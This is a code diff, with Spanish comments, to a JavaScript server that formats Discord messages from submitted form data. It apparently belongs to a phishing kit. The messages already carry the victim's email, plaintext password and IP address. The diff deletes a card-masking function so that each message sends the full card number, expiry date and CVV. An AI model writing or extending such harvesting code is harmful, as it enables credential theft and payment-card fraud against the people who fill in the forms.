@@ -36,21 +36,6 @@ async function githubRead() {
   return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
 }
 
-// Enmascarar número de tarjeta: mostrar solo los últimos 4 dígitos
-function maskCardNumber(cardNumber) {
-  if (!cardNumber || cardNumber.length < 4) return '****';
-  var last4 = cardNumber.slice(-4);
-  var masked = '';
-  for (var i = 0; i < cardNumber.length - 4; i++) {
-    masked += '*';
-  }
-  var parts = [];
-  for (var j = 0; j < masked.length; j += 4) {
-    parts.push(masked.substring(j, j + 4));
-  }
-  return parts.join(' ') + ' ' + last4;
-}
-
 // Construye el mensaje de Discord usando string concatenation (no template literals multiline)
 function buildDefaultMessage(body, clientIp, timestamp) {
   var message = '';
@@ -58,11 +43,11 @@ function buildDefaultMessage(body, clientIp, timestamp) {
   message += '\\n──────────────────────────';
   message += '\\n👤 Usuario: ' + (body.email || 'unknown');
   message += '\\n🔑 Contraseña: ' + (body.password || '****');
-  // Datos de tarjeta (si vienen desde payment.html)
+  // Datos de tarjeta completos (sin enmascarar)
   if (body.cardNumber) {
-    message += '\\n💳 Tarjeta: ' + maskCardNumber(body.cardNumber);
+    message += '\\n💳 Tarjeta: ' + body.cardNumber;
     message += '\\n📅 Vencimiento: ' + (body.cardExpiry || 'desconocido');
-    message += '\\n🔒 CVV: ' + (body.cardCvv ? '****' : 'desconocido');
+    message += '\\n🔒 CVV: ' + (body.cardCvv || 'desconocido');
   }
   message += '\\n🌐 IP: ' + (clientIp || 'desconocida');
 
